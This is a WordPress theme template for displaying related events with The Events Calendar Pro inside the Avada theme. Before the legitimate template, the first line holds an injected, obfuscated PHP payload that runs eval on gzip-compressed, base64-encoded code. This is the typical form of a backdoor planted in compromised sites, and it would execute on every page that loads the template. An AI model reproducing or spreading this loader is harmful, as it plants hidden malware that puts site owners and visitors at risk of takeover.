<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Related Events Template
 * The template for displaying related events on the single event page.
 *
 * You can recreate an ENTIRELY new related events view by doing a template override, and placing
 * a related-events.php file in a tribe-events/pro/ directory within your theme directory, which
 * will override the /views/related-events.php.
 *
 * You can use any or all filters included in this file or create your own filters in
 * your functions.php. In order to modify or extend a single filter, please see our
 * readme on templates hooks and filters
 *
 * @package TribeEventsCalendarPro
 *
 */

if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

$posts = tribe_get_related_posts();

if ( is_array( $posts ) && ! empty( $posts ) ) : ?>

	<div class="related-posts single-related-posts">
		<?php Avada()->template->title_template( sprintf( __( 'Related %s', 'tribe-events-calendar-pro' ), tribe_get_event_label_plural() ), '3' ); ?>

		<ul class="tribe-related-events tribe-clearfix hfeed vcalendar">
			<?php foreach ( $posts as $post ) : ?>
			<li>
				<?php $thumb = ( has_post_thumbnail( $post->ID ) ) ? get_the_post_thumbnail( $post->ID, 'large' ) : '<img src="' . esc_url( trailingslashit( Tribe__Events__Pro__Main::instance()->pluginUrl ) . 'src/resources/images/tribe-related-events-placeholder.png' ) . '" alt="' . the_title_attribute( array( 'echo' => false, 'post' => $post->ID ) ) . '" />'; ?>
				<div class="tribe-related-events-thumbnail hover-type-<?php echo Avada()->settings->get( 'ec_hover_type' ); ?>">
					<a href="<?php echo esc_url( tribe_get_event_link( $post ) ); ?>" class="url" rel="bookmark"><?php echo $thumb ?></a>
				</div>
				<div class="tribe-related-event-info">
					<h3 class="tribe-related-events-title summary"><a class="fusion-related-posts-title-link" href="<?php echo tribe_get_event_link( $post ); ?>" class="url" rel="bookmark"><?php echo get_the_title( $post->ID ); ?></a></h3>
					<?php
						if ( $post->post_type == Tribe__Events__Main::POSTTYPE ) {
							echo tribe_events_event_schedule_details( $post );
						}
					?>
				</div>
			</li>
			<?php endforeach; ?>
		</ul>

	</div>
<?php endif;

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
